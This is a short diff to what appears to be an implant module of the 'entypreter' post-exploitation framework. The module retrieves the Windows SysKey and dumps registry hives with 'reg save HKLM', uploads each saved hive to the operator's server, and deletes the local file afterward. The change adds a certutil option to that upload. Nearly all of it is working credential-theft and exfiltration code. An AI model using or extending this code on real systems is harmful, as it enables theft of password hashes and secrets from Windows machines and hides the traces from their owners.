@@ -18,11 +18,7 @@ function GetSysKey()
     var headers = {};
     headers["Task"] = "SysKey";
 
-    if (entypreter.user.encoder == "936")
-    {
-        //do nothing
-    }
-    else
+    if (entypreter.user.encoder != "936")
     {
         data = data.replace(/\\/g, "\\\\");
         data = data.replace(/\0/g, "\\0");
@@ -50,7 +46,7 @@ function DumpHive(name, uuid)
 
     entypreter.shell.run("reg save HKLM\\" + name + " " + path + " /y", false);
 
-    entypreter.http.upload(path, name, "Task");
+    entypreter.http.upload(path, name, ~CERTUTIL~, "Task");
     entypreter.file.deleteFile(path);
 }
 
